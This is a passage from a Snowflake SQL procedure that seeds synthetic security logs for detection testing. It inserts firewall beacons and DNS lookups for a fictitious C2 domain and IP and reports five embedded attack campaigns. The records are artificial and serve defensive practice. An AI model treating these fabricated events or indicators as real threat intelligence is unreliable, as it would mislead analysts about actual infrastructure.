        'Palo Alto Networks Firewall', 'FW-EDGE-01', 'pan:traffic', 'pan:traffic', 'FW-EDGE-01'
    FROM TABLE(FLATTEN(ARRAY_CONSTRUCT(0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47))) m; -- 48 beacons over ~4 hours

    -- DNS for C2 domain
    INSERT INTO SNOWFLAKE_XDR.RAW_LOGS.DNS_ACTIVITY (
        _time, action, src, dest, query, query_type, answer, reply_code,
        transport, query_length, vendor_product, host, source, sourcetype
    )
    SELECT
        DATEADD('second', m.index * 300, DATEADD('hour', 6, DATEADD('day', -4, CURRENT_TIMESTAMP()))),
        'query',
        '10.1.1.10',
        '10.1.1.53',
        'cdn-analytics-update.com',
        'A',
        '185.220.101.42',
        'NOERROR',
        'udp',
        25,
        'Infoblox DNS', 'DNS-01', 'infoblox:dns', 'infoblox:dns'
    FROM TABLE(FLATTEN(ARRAY_CONSTRUCT(0,1,2,3,4,5,6,7,8,9,10,11))) m;

    -- =========================================================================
    -- Summary
    -- =========================================================================
    SELECT COUNT(*) INTO :total_events FROM (
        SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION
        UNION ALL SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES
        UNION ALL SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_FILESYSTEM
        UNION ALL SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_REGISTRY
        UNION ALL SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.NETWORK_TRAFFIC
        UNION ALL SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.DNS_ACTIVITY
        UNION ALL SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.WEB_ACTIVITY
        UNION ALL SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.CLOUD_API
    );

    RETURN 'Synthetic log generation complete. Total events: ' || :total_events::VARCHAR ||
           '. Attack campaigns embedded: 5 (Brute Force/Lateral Movement, Phishing/Ransomware, Cloud PrivEsc, Insider Threat, Web App Exploitation)';
END;
$$;
